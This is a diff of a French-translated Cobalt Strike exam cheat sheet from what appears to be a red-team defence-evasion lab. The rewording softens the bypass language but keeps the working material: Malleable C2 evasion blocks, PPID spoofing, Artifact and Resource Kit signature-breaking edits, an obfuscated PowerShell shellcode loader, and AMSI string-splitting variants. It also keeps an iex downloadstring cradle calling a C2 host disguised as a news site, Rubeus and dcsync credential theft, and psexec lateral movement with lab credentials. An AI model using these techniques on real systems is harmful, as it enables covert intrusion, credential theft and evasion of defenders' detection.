@@ -453,10 +453,10 @@ jump psexec / psexec64 / psexec_psh
 remote-exec psexec
 ```
 
-> **Service spawnto note:** Service payloads always default to `rundll32`. `post-ex.spawnto` env vars don't resolve in SYSTEM context. Use `ak-settings` in Artifact Kit to set an explicit path instead.
+> **Paramètre spawnto des services :** dans le scénario, certains payloads de services utilisent `rundll32` par défaut. Les variables d’environnement peuvent être interprétées différemment sous SYSTEM ; `ak-settings` définit un chemin explicite dans l’Artifact Kit.
 
-### Malleable C2 — `process-inject` block
-Controls how BOFs and fork&run shellcode is injected:
+### Malleable C2 — Bloc `process-inject`
+Ce bloc définit les paramètres associés aux BOF et aux opérations fork-and-run :
 
 ```
 process-inject {
@@ -472,8 +472,8 @@ process-inject {
 }
 ```
 
-### Malleable C2 — `post-ex` block
-Controls fork&run sacrificial process and post-ex DLL modifications:
+### Malleable C2 — Bloc `post-ex`
+Ce bloc définit les paramètres des processus temporaires et des DLL post-exploitation :
 
 ```
 post-ex {
@@ -488,15 +488,15 @@ post-ex {
 
 ---
 
-## Blending Post-Ex — PPID Spoofing & spawnto
+## Post-Exploitation — PPID et spawnto
 
-### The Problem
+### Comprendre le contexte
 
-Beacon inside `msedge.exe` spawning `cmd.exe` or `powershell.exe` as a child = immediately suspicious.
+Un Beacon hébergé par `msedge.exe` qui lance `cmd.exe` ou `powershell.exe` peut présenter une arborescence de processus inhabituelle.
 
-**Rule:** C2 profile `post-ex.spawnto` is a *default only*. Every command must be evaluated against the current beacon's host process context.
+**Principe :** `post-ex.spawnto` fournit une valeur par défaut. L’interprétation de chaque commande doit tenir compte du processus hébergeant le Beacon.
 
-### PPID Spoofing — `shell` and `run`
+### PPID Spoofing — `shell` et `run`
 
 ```
 beacon> process_browser                 # GUI tab — find PID of desired parent (e.g. explorer.exe), right-click → steal token / inject
@@ -505,7 +505,7 @@ beacon> shell whoami                    # Appears as child of explorer.exe
 beacon> run net user
 ```
 
-### spawnto Override — Fork & Run (`execute-assembly`, `powerpick`)
+### Paramètres spawnto — Fork-and-run
 
 ```
 beacon> ppid <explorer PID>
@@ -513,21 +513,21 @@ beacon> spawnto x64 %windir%\sysnative\notepad.exe
 beacon> execute-assembly Rubeus.exe kerberoast /nowrap
 ```
 
-### Blending Guidelines
+### Cohérence des processus
 
-| Beacon host process | Appropriate ppid parent | Appropriate spawnto |
+| Processus du Beacon | Parent PPID présenté | Processus spawnto |
 |--------------------|------------------------|---------------------|
-| `msedge.exe` | `explorer.exe` | `msedge.exe` (another instance) or `dllhost.exe` |
+| `msedge.exe` | `explorer.exe` | `msedge.exe` (autre instance) ou `dllhost.exe` |
 | `outlook.exe` | `explorer.exe` | `dllhost.exe` / `msiexec.exe` |
 | `svchost.exe` | `services.exe` | `svchost.exe` / `dllhost.exe` |
 
-HTTP/S Beacon → run inside a process that legitimately makes outbound HTTP requests.
+Les communications HTTP/S doivent être analysées dans le contexte du processus et de l’activité réseau réellement attendue.
 
 ---
 
-## Command-Line Detections (Kernel Callbacks)
+## Détection des lignes de commande (Kernel Callbacks)
 
-### How Defender Blocks at Process Creation
+### Blocage à la création d’un processus
 
 ```
 Kernel: PsSetCreateProcessNotifyRoutineEx callback
@@ -537,31 +537,31 @@ Struct: PS_CREATE_NOTIFY_INFO
   → CreationStatus  (driver sets STATUS_ACCESS_DENIED to block)
 ```
 
-Surfaces as **Access Denied** error in beacon output — not a named AV alert.
+Dans le lab, un blocage peut apparaître sous la forme de l’erreur **Access Denied**, sans alerte antivirus explicite dans la console.
 
-### Known Blocked Patterns
+### Comportements bloqués dans le lab
 
-| Command | Internally runs | Blocked pattern |
+| Commande | Action interne | Comportement bloqué |
 |---------|----------------|----------------|
-| `pth` | Mimikatz `sekurlsa::pth` | Named pipe impersonation + Mimikatz args |
-| `uac-schtasks` (Elevate Kit) | `schtasks.exe /SilentCleanup` | SilentCleanup arg on schtasks.exe command line |
+| `pth` | Mimikatz `sekurlsa::pth` | Impersonation de named pipe et arguments Mimikatz |
+| `uac-schtasks` (Elevate Kit) | `schtasks.exe /SilentCleanup` | Argument SilentCleanup de la commande schtasks.exe |
 
-### Bypass Strategy
+### Comparer les mécanismes et leurs effets
 
-Cannot disable kernel callbacks without kernel code execution. **Find an alternative that achieves the same result without the flagged command line:**
+Les Kernel Callbacks peuvent observer ou bloquer certaines créations de processus. Le tableau du lab compare plusieurs mécanismes, dont les effets doivent être évalués séparément :
 
-| Blocked | Alternative |
+| Comportement concerné | Autre mécanisme étudié |
 |---------|------------|
-| `schtasks.exe /SilentCleanup` | COM object or API that triggers the task directly |
-| `pth` (Mimikatz CLI) | `Rubeus.exe createnetonly` + `ptt` for token impersonation |
-| Direct LSASS dump CLI tools | `krb_dump` (Kerbeus-BOF) — Kerberos API, no raw LSASS read; use `dcsync` from DA beacon for NTLM hashes |
+| `schtasks.exe /SilentCleanup` | API COM associée au déclenchement de tâches |
+| `pth` (Mimikatz CLI) | `Rubeus.exe createnetonly` + `ptt` pour l’impersonation de token |
+| Direct LSASS dump CLI tools | `krb_dump` (Kerbeus-BOF) — API Kerberos sans lecture directe de la mémoire LSASS |
 
-You cannot just rely on settings in your C2 profile for post-ex defence evasion.  
-Every command you run must blend in based on where your current Beacon is running and what command you want to run.  
+Les seuls paramètres du profil C2 ne suffisent pas à décrire le comportement observable des opérations post-exploitation.  
+Évaluer chaque commande selon les processus, événements et connexions réseau qu’elle peut produire.  
 
 ---
 
-## Defence Evasion Workflow (Exam Day Order)
+## Enchaînement des vérifications Defense Evasion
 
 ```
 1. Build Artifact Kit
@@ -591,7 +591,7 @@ Every command you run must blend in based on where your current Beacon is runnin
 
 ---
 
-## OPSEC Quick Reference
+## Aide-mémoire OPSEC
 
 ```
 SAFE:    inline-execute (BOF) | API-only | steal_token | rev2self | powerpick
@@ -599,24 +599,24 @@ CAUTION: execute-assembly | portscan | mimikatz (fork&run) | dcsync
 UNSAFE:  shell | powershell | run | runas | jump psexec | service creation
 ```
 
-### Defender Signature Checklist
+### Liste de contrôle Defender
 
-- [ ] Artifact templates clean (ThreatCheck — Defender engine)
-- [ ] PS1 resource templates clean (ThreatCheck — AMSI engine)
-- [ ] `stage.userwx false` — no RWX memory
-- [ ] `stage.copyheaders false` — no PE headers in memory
-- [ ] `stage.module_x64` set — memory backed by legit module
-- [ ] Beacon DLL strings reviewed (`strings beacon_raw.x64.dll`)
-- [ ] spawnto overridden from default `rundll32.exe`
-- [ ] PPID spoofing configured before post-ex commands
+- [ ] Résultat de ThreatCheck pour les templates Artifact Kit
+- [ ] Résultat de ThreatCheck pour les templates PowerShell (AMSI)
+- [ ] `stage.userwx false` — pas de mémoire RWX dans le scénario
+- [ ] `stage.copyheaders false` — gestion des en-têtes PE en mémoire
+- [ ] `stage.module_x64` set — vérification du module associé à la région mémoire
+- [ ] chaînes de la DLL Beacon examinées (`strings beacon_raw.x64.dll`)
+- [ ] configuration spawnto documentée par rapport à `rundll32.exe`
+- [ ] configuration PPID examinée avant les opérations post-exploitation
 
 ---
 
-## LAB-PROVEN CONFIG — Exam Quick Reference
+## Configuration rapportée dans le lab — Aide-mémoire
 
-> Exact values from ZPS Defence Evasion lab. Verified working against Defender in Skillable environment.
+> Valeurs relevées dans le lab ZPS Defence Evasion. Les résultats des tests ne prouvent pas un comportement identique dans un autre environnement.
 
-### Team Server — Profile Location & Restart
+### Team Server — Emplacement du profil et redémarrage
 
 ```bash
 ssh attacker@10.0.0.5          # Password: Passw0rd!
@@ -630,7 +630,7 @@ sudo /usr/bin/docker restart cobaltstrike-cs-1
 sudo /usr/bin/docker logs cobaltstrike-cs-1
 ```
 
-### Malleable C2 — stage Block (Lab-Proven)
+### Malleable C2 — Bloc `stage` du lab
 
 ```
 stage {
@@ -649,11 +649,11 @@ stage {
 }
 ```
 
-> `strrep` replaces strings in the Beacon DLL before it's loaded. The raw-byte strrep flips a single byte (`\x00` → `\x01`) to break a known signature without breaking functionality.
+> `strrep` remplace des chaînes dans la DLL Beacon avant son chargement. L’exemple du lab modifie l’octet `\x00` en `\x01`.
 
 ---
 
-### Malleable C2 — post-ex Block (Lab-Proven)
+### Malleable C2 — Bloc `post-ex` du lab
 
 ```
 post-ex {
@@ -673,15 +673,15 @@ post-ex {
 }
 ```
 
-**Key values:**
-| Setting | Value | Why |
+**Paramètres principaux :**
+| Paramètre | Valeur | Explication |
 |---------|-------|-----|
-| `spawnto_x64` | `werfault.exe` | Windows Error Reporting — legitimate, spawns frequently |
-| `pipename` | `dotnet-diagnostic-*` | Blends with .NET diagnostic named pipes |
-| `thread_hint` | `ntdll.dll!RtlUserThreadStart+0x2c` | Thread start disguised as legitimate ntdll location |
-| `amsi_disable` | `true` | Disables AMSI in fork & run post-ex DLLs |
+| `spawnto_x64` | `werfault.exe` | Windows Error Reporting : processus système présent dans certaines activités Windows |
+| `pipename` | `dotnet-diagnostic-*` | Format ressemblant aux named pipes de diagnostic .NET |
+| `thread_hint` | `ntdll.dll!RtlUserThreadStart+0x2c` | Valeur d’indication du point d’entrée d’un thread dans ntdll |
+| `amsi_disable` | `true` | Paramètre de désactivation AMSI des DLL post-exploitation du lab |
 
-**`strrepex` syntax** (post-ex DLL string replacement — module-scoped):
+**Syntaxe `strrepex` :** remplacement de chaîne limité au module DLL post-exploitation.
 ```
 strrepex "<Module>" "<original string>" "<replacement>";
 # Module = "PowerPick" or "ExecuteAssembly" — targets specific post-ex DLL
@@ -690,7 +690,7 @@ strrepex "<Module>" "<original string>" "<replacement>";
 
 ---
 
-### Malleable C2 — process-inject Block (Lab-Proven)
+### Malleable C2 — Bloc `process-inject` du lab
 
 ```
 process-inject {
@@ -710,27 +710,27 @@ process-inject {
 }
 ```
 
-**Key values:**
-| Setting | Value | Why |
+**Paramètres principaux :**
+| Paramètre | Valeur | Explication |
 |---------|-------|-----|
-| `allocator` | `VirtualAllocEx` | Remote process injection — standard but no RWX |
-| `bof_allocator` | `VirtualAlloc` | BOF uses local alloc (no remote process) |
-| `bof_reuse_memory` | `true` | Reuses previously allocated BOF memory — reduces alloc events |
-| `startrwx` / `userwx` | `false` | No RWX memory at any stage |
-| `execute` methods | 4 options listed | CS tries each in order until one succeeds |
+| `allocator` | `VirtualAllocEx` | Allocation mémoire distante utilisée dans le scénario |
+| `bof_allocator` | `VirtualAlloc` | Allocation locale pour les BOF |
+| `bof_reuse_memory` | `true` | Réutilisation de mémoire préalablement allouée aux BOF |
+| `startrwx` / `userwx` | `false` | Absence de pages RWX selon les réglages présentés |
+| `execute` methods | 4 options listed | Cobalt Strike examine les méthodes dans l’ordre indiqué |
 
 ---
 
-### Artifact Kit — Exact Lab Steps
+### Artifact Kit — Étapes du lab
 
-**1. Patch `patch.c` in VSCode**
+**1. Examiner `patch.c` dans VS Code**
 
 ```
 File > Open Folder → C:\Tools\cobaltstrike\arsenal-kit\kits\artifact
 Open: src-common\patch.c
 ```
 
-**Line ~45** — svc.exe payload loop (replace):
+**Ligne ~45 :** exemple de boucle du payload `svc.exe` :
 ```c
 // OLD (signatured for loop):
 // for ( int x = 0; x < length; x++ ) { ... }
@@ -742,7 +742,7 @@ while ( x-- ) {
 }
 ```
 
-**Line ~116** — normal .exe payload loop (replace):
+**Ligne ~116 :** exemple de boucle du payload `.exe` classique :
 ```c
 // OLD (signatured for loop):
 // for ( int x = 0; x < length; x++ ) { ... }
@@ -754,9 +754,9 @@ while ( x-- ) {
 }
 ```
 
-> Comment out old code, don't delete — easy rollback if build breaks.
+> Conserver l’historique Git du code précédent pour faciliter la comparaison et le retour arrière.
 
-**2. Build in WSL**
+**2. Compiler dans WSL**
 
 ```bash
 cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
@@ -768,7 +768,7 @@ cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
 ./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
 ```
 
-Build output confirmation:
+Vérification de la sortie de compilation :
 ```
 [Artifact Kit] [+] You have a x86_64 minge — I will recompile the artifacts
 [Artifact Kit] [-] Using allocator: VirtualAlloc
@@ -776,14 +776,14 @@ Build output confirmation:
 [Artifact Kit] [+] The artifacts for the bypass technique 'mailslot' are saved in '...'
 ```
 
-**3. Load into CS**
+**3. Charger dans Cobalt Strike**
 
 ```
 Cobalt Strike > Script Manager > Load
 → C:\Tools\cobaltstrike\custom-artifacts\mailslot\artifact.cna
 ```
 
-**4. ThreatCheck after build**
+**4. Contrôler avec ThreatCheck après compilation**
 
 ```cmd
 C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe"
@@ -792,7 +792,7 @@ C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\tools\cobaltst
 
 ---
 
-### Resource Kit — Exact Lab Steps
+### Resource Kit — Étapes du lab
 
 **1. Build in WSL**
 
@@ -801,14 +801,14 @@ cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
 ./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
 ```
 
-**2. Fix `template.x64.ps1` in VSCode**
+**2. Examiner `template.x64.ps1` dans VS Code**
 
 ```
 File > Open Folder → C:\Tools\cobaltstrike\custom-resources
 Open: template.x64.ps1
 ```
 
-**Line 5** — break `System.dll` string signature:
+**Ligne 5 :** exemple de modification de la chaîne `System.dll` :
 ```powershell
 # Before:
 .Equals('System.dll')
@@ -816,7 +816,7 @@ Open: template.x64.ps1
 .Equals('Sys'+'tem.dll')
 ```
 
-**Line 32** — replace `Marshal.Copy` with `WriteProcessMemory`:
+**Ligne 32 :** variante utilisant `WriteProcessMemory` à la place de `Marshal.Copy` :
 ```powershell
 $var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
     (func_get_proc_address kernel32.dll WriteProcessMemory),
@@ -825,23 +825,23 @@ $var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPoint
 $ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)
 ```
 
-**3. Replace `compress.ps1`** with obfuscated version (Invoke-Obfuscation token obfuscation):
+**3. Examiner la version modifiée de `compress.ps1`** à partir d’Invoke-Obfuscation :
 
 ```powershell
 # Obfuscated compress.ps1 — do NOT change %%DATA%% placeholder:
 SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();
 ```
 
-> `%%DATA%%` is the shellcode placeholder — CS patches shellcode into this slot. Never obfuscate or rename it.
+> `%%DATA%%` est un espace réservé par Cobalt Strike pour les données du payload. Il doit conserver son nom pour que le template fonctionne.
 
-**4. ThreatCheck AMSI scan**
+**4. Analyse AMSI avec ThreatCheck**
 
 ```cmd
 .\C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\template.x64.ps1 -e AMSI -t Script
 # Clean = "No threat found". Detected = fix the flagged line → re-scan
 ```
 
-**5. Load into CS**
+**5. Charger dans Cobalt Strike**
 
 ```
 Cobalt Strike > Script Manager > Load
@@ -850,15 +850,15 @@ Cobalt Strike > Script Manager > Load
 
 ---
 
-### Service Payload spawnto — `ak-settings`
+### Paramètre spawnto des payloads de service — `ak-settings`
 
-Service payloads (`jump psexec64`) always default to `rundll32.exe` as spawnto — env vars like `%windir%` don't resolve in SYSTEM context. Override with an explicit path via Artifact Kit:
+Dans le scénario, certains payloads de service utilisent `rundll32.exe` par défaut. Les variables d’environnement peuvent être interprétées différemment sous SYSTEM ; l’Artifact Kit accepte un chemin explicite :
 
 ```
 beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
 ```
 
-Then lateral move:
+Étape Lateral Movement présentée dans le lab :
 ```
 beacon> make_token CONTOSO\rsteel Passw0rd!
 beacon> jump psexec64 lon-ws-1 smb
@@ -866,29 +866,27 @@ beacon> jump psexec64 lon-ws-1 smb
 
 ---
 
-### Testing — Scripted Web Delivery
+### Test — Distribution web d’un script
 
 ```
 CS GUI: Attacks > Scripted Web Delivery
 Select: http listener → Launch → copy URL
 ```
 
-On target (Workstation — PowerShell):
+Sur la workstation du lab (PowerShell) :
 ```powershell
 iex (new-object net.webclient).downloadstring("http://www.bleepincomputer.com/<uri>")
 ```
 
-New beacon checks in on attacker desktop → confirm `getuid`, check `ps` for Defender processes.
+Vérifier dans Cobalt Strike la connexion du nouveau Beacon et consulter les résultats de `getuid` et `ps`.
 
 ---
 
-### HTTP Listener Host Masquerading — `www.bleepincomputer.com`
+### En-tête Host du listener HTTP — `www.bleepincomputer.com`
 
-> **Exam OPSEC criterion:** "Outbound from unusual processes" — the C2 Host header is part of this.
+> **Critère OPSEC évoqué :** les communications sortantes de processus inhabituels et l’en-tête HTTP Host peuvent être examinés.
 
-The `HTTP Hosts` / `HTTP Host (Stager)` value in the CS listener controls what goes in the
-HTTP `Host:` header of Beacon's check-in and staging requests. The TCP connection still goes
-to the team server IP — only the HTTP header changes.
+Le paramètre `HTTP Hosts` / `HTTP Host (Stager)` du listener Cobalt Strike définit l’en-tête HTTP `Host:` utilisé pour les callbacks et les demandes de staging. L’adresse de la connexion TCP reste celle du team server.
 
 ```
 RAW IP (avoid — obvious C2):
@@ -900,21 +898,17 @@ MASQUERADING (use this):
   SIEM/proxy sees:      Host browsing legitimate security news site → blends in
 ```
 
-In the ZPS lab environment, internal DNS resolves `www.bleepincomputer.com` → team server IP
-(10.0.0.5). You do not configure this — the lab/exam infrastructure handles it.
+Dans l’environnement ZPS présenté, le DNS interne résout `www.bleepincomputer.com` vers l’adresse du team server `10.0.0.5`. Cette résolution appartient à la configuration du lab.
 
-**Exam day:** Keep the HTTP listener host set to a legitimate-looking domain (lab uses
-`www.bleepincomputer.com`). The URL `http://www.bleepincomputer.com/<uri>` in Scripted Web
-Delivery is what you run on the foothold workstation to call back to your team server.
+**Dans le lab :** le listener utilise `www.bleepincomputer.com`. La rubrique Scripted Web Delivery décrit une URL pointant vers l’infrastructure d’entraînement.
 
-**If flagged on network:** change the listener host domain to something more context-appropriate
-(a site the target org would legitimately access). In the exam lab this is pre-configured.
+**Observation réseau :** la valeur Host constitue un élément de télémétrie à comparer avec les connexions et les paramètres DNS réellement configurés.
 
 ---
 
-### Resource Kit — `System.dll` Alternative Bypasses
+### Resource Kit — Autres variantes étudiées pour `System.dll`
 
-If ThreatCheck AMSI still detects after `'Sys'+'tem.dll'` substitution, escalate:
+Le lab présente plusieurs variantes du template après un résultat ThreatCheck sur la chaîne `System.dll` :
 
 ```powershell
 # Variable + concat:
@@ -928,9 +922,9 @@ $s = 'System'; .Equals($s + '.dll')
 # 'U3lzdGVtLmRsbA==' = base64('System.dll')
 ```
 
-### Resource Kit — `WriteProcessMemory` Alternative Bypasses
+### Resource Kit — Variantes de l’appel `WriteProcessMemory`
 
-If the API name string is flagged:
+Dans le cas où le nom de l’API apparaît dans les résultats de détection :
 
 ```powershell
 # Split the API name string:
@@ -944,11 +938,11 @@ $var_ntwvm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPoi
 $var_ntwvm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [ref]0) | Out-Null
 ```
 
-**Priority:** Lab value → ThreatCheck → split string → ThreatCheck → NtWriteVirtualMemory if still flagged.
+**Séquence de comparaison du lab :** variante initiale, analyse ThreatCheck, puis analyse d’une autre variante.
 
 ---
 
-### Lab End-to-End Flow (Exam Day Order)
+### Déroulement complet du lab
 
 ```
 1. SSH to team server → edit /opt/cobaltstrike/profiles/default.profile
@@ -981,8 +975,8 @@ $var_ntwvm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [ref]0
 
 ---
 
-## ⚠️ Defender Observations
+## Observations Microsoft Defender
 
-| Date | Technique | Result | Note |
+| Date | Technique | Résultat | Observation |
 |------|-----------|--------|------|
-| 2026-04-26 | `elevate uac-token-duplication smb` | 🔴 DETECTED — beacon killed | Entire `elevate` built-in family is signatured. Never use on exam day. Use `steal_token` from SYSTEM proc or service EXE abuse instead. |
+| 2026-04-26 | `elevate uac-token-duplication smb` | 🔴 DÉTECTÉ — Beacon interrompu | Les observations du lab signalent une détection de la famille `elevate`. Ce résultat ne peut pas être généralisé sans tests supplémentaires. |
